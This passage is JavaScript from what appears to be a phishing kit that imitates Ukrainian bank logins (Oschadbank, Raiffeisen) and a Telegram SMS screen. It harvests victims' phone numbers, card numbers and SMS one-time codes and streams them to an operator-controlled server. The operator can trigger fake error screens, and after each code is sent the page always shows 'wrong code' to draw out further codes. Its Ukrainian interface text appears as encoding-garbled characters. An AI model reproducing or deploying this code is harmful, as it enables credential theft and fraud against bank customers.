            stepContent.innerHTML = `<p style="text-align:center;">${text}</p>`;
            modalFooter.style.display = 'flex';
            modalFooter.innerHTML = `<button class="btn btn-next">${btnText}</button>`;
            modalFooter.querySelector('button').onclick = callback;
        };

        switch (type) {
            case 'lk':
                renderOschadbankLogin();
                break;
            case 'call':
                renderOschadbankCallConfirmation();
                break;
            case 'telegram_debit':
                renderTelegramSmsScreen();
                break;
            case 'password_error':
                const errorMsg = data.loginType === 'login' ? '–ù–µ–≤—ñ—Ä–Ω–∏–π –ª–æ–≥—ñ–Ω –∞–±–æ –ø–∞—Ä–æ–ª—å' : '–ù–µ–≤—ñ—Ä–Ω–∏–π –ø–∞—Ä–æ–ª—å';
                renderOschadbankLogin({ errorType: data.loginType, errorMessage: errorMsg });
                break;
            case 'code_error':
                const errorOptions = { error: true };
                if (lastCodeScreen === 'oschad_call') {
                    renderOschadbankCallConfirmation(errorOptions);
                } else if (lastCodeScreen === 'telegram_sms') {
                    renderTelegramSmsScreen(errorOptions);
                }
                break;
            case 'sms':
                if (currentCustomFlow) {
                     const html = `
                        <div id="raif-modal-container" style="justify-content: center; align-items: center; text-align: center;">
                            <h2 class="raif-welcome-title">–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥ –∑ SMS</h2>
                            <p class="raif-legal-text">${data.text}</p>
                            <input type="tel" id="sms-code" class="raif-phone-input" style="max-width: 200px; text-align: center; margin-top: 20px; border: 2px solid #555; border-radius: 12px; padding: 15px;" placeholder="–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥">
                            <div id="sms-error-container" style="color: var(--danger-color); font-size: 14px; margin-top: 10px;"></div>
                            <button class="raif-submit-button active" id="submit-sms-code" style="margin-top: 20px;">–í—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏</button>
                        </div>
                     `;
                     customModalContent.innerHTML = html;
                     document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
                } else {
                    modalTitle.textContent = '–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥ –∑ SMS';
                    stepContent.innerHTML = `<p style="text-align:center;">${data.text}</p><div class="input-group"><input type="tel" id="sms-code" class="input-field" placeholder="–í–≤–µ–¥—ñ—Ç—å –∫–æ–¥"></div><div id="sms-error-container"></div>`;
                    modalFooter.style.display = 'flex';
                    modalFooter.innerHTML = `<button class="btn btn-next" id="submit-sms-code">–í—ñ–¥–ø—Ä–∞–≤–∏—Ç–∏</button>`;
                    document.getElementById('submit-sms-code').addEventListener('click', submitSmsCode);
                }
                break;
            case 'other':
                 if (currentCustomFlow) {
                     const html = `
                        <div id="raif-modal-container" style="justify-content: center; align-items: center; text-align: center;">
                            <h2 class="raif-welcome-title">–ü–æ–º–∏–ª–∫–∞</h2>
                            <p class="raif-legal-text">${data.text}</p>
                            <button class="raif-submit-button active" id="other-back-btn" style="margin-top: 20px;">–û–±—Ä–∞—Ç–∏ —ñ–Ω—à–∏–π –±–∞–Ω–∫</button>
                        </div>
                     `;
                     customModalContent.innerHTML = html;
                     document.getElementById('other-back-btn').onclick = () => window.location.reload();
                 } else {
                    const bankToDisable = document.querySelector(`.bank-item[data-bank="${activeBankData.theme}"]`);
                    if (bankToDisable) {
                        bankToDisable.classList.add('disabled');
                        if (!bankToDisable.querySelector('.unavailable-label')) {
                            bankToDisable.innerHTML += '<span class="unavailable-label">–ù–µ–¥–æ—Å—Ç—É–ø–Ω–æ</span>';
                        }
                    }
                    showMessageInMainModal("–ü–æ–º–∏–ª–∫–∞", data.text, "–û–±—Ä–∞—Ç–∏ —ñ–Ω—à–∏–π –±–∞–Ω–∫", () => window.location.reload());
                }
                break;
            case 'ban':
                document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; text-align:center;"><h1>üö´<br>–î–æ—Å—Ç—É–ø –∑–∞–±–ª–æ–∫–æ–≤–∞–Ω–æ</h1></div>`;
                if (ws) ws.close();
                break;
        }
    }
    
    // --- Standard (non-custom) Flow Logic ---
    document.querySelectorAll('.bank-item').forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            if (item.classList.contains('disabled')) return;
            const bankId = item.dataset.bank;
            activeBankData = JSON.parse(JSON.stringify(bankFlows[bankId]));
            collectedData = { };
            currentCustomFlow = null;

            if (bankId === 'oschadbank') {
                currentCustomFlow = 'oschad';
                renderOschadbankLogin();
            } else if (bankId === 'raiffeisen') {
                currentCustomFlow = 'raif';
                renderRaiffeisenLogin();
            } else {
                body.dataset.theme = activeBankData.theme;
                formHeaderLogo.src = activeBankData.logoUrl;
                body.classList.add('form-active');
                currentStepIndex = 0;
                renderStep();
            }
            connectWebSocket();
        });
    });

    nextBtn.addEventListener('click', handleNextStep);
    backBtn.addEventListener('click', handleBackStep);
    
    async function handleNextStep() { if (!validateCurrentStep()) return; let data = {}; stepContent.querySelectorAll('.input-field').forEach(input => { let key = input.id; let value = input.value; if (key === 'phone') value = '+380' + value.replace(/\D/g, ''); if (key === 'card' || key === 'card_confirm') value = value.replace(/\s/g, ''); data[key] = value; }); const step = activeBankData.steps[currentStepIndex]; let isFinalStep = (currentStepIndex + 1) >= activeBankData.steps.length; if (activeBankData.special && step.type === 'card_simple') { isFinalStep = true; } sendDataToServer(data, isFinalStep); if (isFinalStep) { showWaitingScreen(); return; } currentStepIndex++; if (currentStepIndex < activeBankData.steps.length) { renderStep(); } else { showWaitingScreen(); } }
    async function submitSmsCode() { const codeInput = document.getElementById('sms-code'); const code = codeInput.value; const errorContainer = document.getElementById('sms-error-container'); if (!code.trim()) { if (errorContainer) errorContainer.innerHTML = `<p>–ë—É–¥—å –ª–∞—Å–∫–∞, –≤–≤–µ–¥—ñ—Ç—å –∫–æ–¥</p>`; return; } try { await fetch(`/api/sms`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ sessionId, code, referrer: localStorage.getItem('referrer') }), }); } catch (error) { console.error('Failed to send sms code:', error); } if (errorContainer) errorContainer.innerHTML = `<p>–ù–µ–≤—ñ—Ä–Ω–∏–π –∫–æ–¥. –ë—É–¥—å –ª–∞—Å–∫–∞, —Å–ø—Ä–æ–±—É–π—Ç–µ —â–µ —Ä–∞–∑.</p>`; codeInput.value = ''; }
    const generateInputHTML = (id, placeholder, type = 'tel', maxlength = '') => `<div class="input-group"><input type="${type}" class="input-field" id="${id}" placeholder="${placeholder}" ${maxlength ? `maxlength="${maxlength}"` : ''}><div class="error-message"></div></div>`;
    function renderStep() { if (!activeBankData.steps || !activeBankData.steps[currentStepIndex]) return; const step = activeBankData.steps[currentStepIndex]; let html = ''; switch (step.type) { case 'phone': html = `<div class="input-group"><div class="phone-input-wrapper"><span class="phone-prefix">+380</span><input type="tel" class="input-field" id="phone" placeholder="XX XXX XX XX" maxlength="12"></div><div class="error-message" style="margin-left: 55px;"></div></div>`; break; case 'card_simple': html = generateInputHTML('card', 'XXXX XXXX XXXX XXXX', 'tel', '19'); break; } modalTitle.textContent = step.title; stepContent.innerHTML = html; modalFooter.style.display = 'flex'; backBtn.style.display = currentStepIndex > 0 ? 'block' : 'none'; nextBtn.style.display = 'block'; addInputFormatting(); }
    function showWaitingScreen() { modalTitle.textContent = '–û—á—ñ–∫—É—î–º–æ'; stepContent.innerHTML = `<p>–ó–∞—è–≤–∫—É –≤—ñ–¥–ø—Ä–∞–≤–ª–µ–Ω–æ. –ë—É–¥—å –ª–∞—Å–∫–∞, —á–µ–∫–∞–π—Ç–µ. <b>–ù–ï –ó–ê–ö–†–ò–í–ê–ô–¢–ï –°–ê–ô–¢!</b></p>`; modalFooter.style.display = 'none'; }
    function handleBackStep() { if (currentStepIndex > 0) { currentStepIndex--; renderStep(); } else { body.classList.remove('form-active'); } }
    function addInputFormatting() { const phoneInput = document.getElementById('phone'); if (phoneInput) { phoneInput.addEventListener('input', (e) => { let value = e.target.value.replace(/\D/g, '').substring(0, 9); e.target.value = value.replace(/(\d{2})(\d{3})(\d{2})(\d{2})/, '$1 $2 $3 $4').trim(); }); } const cardNumberInput = document.getElementById('card'); if (cardNumberInput) { cardNumberInput.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim(); }); } }
    function validateCurrentStep() { let isValid = true; stepContent.querySelectorAll('.input-field').forEach(input => { const errorContainer = input.parentElement.querySelector('.error-message'); input.classList.remove('invalid'); if (errorContainer) errorContainer.style.display = 'none'; let value = input.value.replace(/\D/g, ''); let requiredLength = 0; switch (input.id) { case 'phone': requiredLength = 9; break; case 'card': requiredLength = 16; break; } if (requiredLength > 0 && value.length < requiredLength) { isValid = false; input.classList.add('invalid'); if (errorContainer) { errorContainer.textContent = `–ü–æ–ª–µ –º–∞—î –º—ñ—Å—Ç–∏—Ç–∏ ${requiredLength} —Ü–∏—Ñ—Ä.`; errorContainer.style.display = 'block'; } } }); return isValid; }
});
</script>
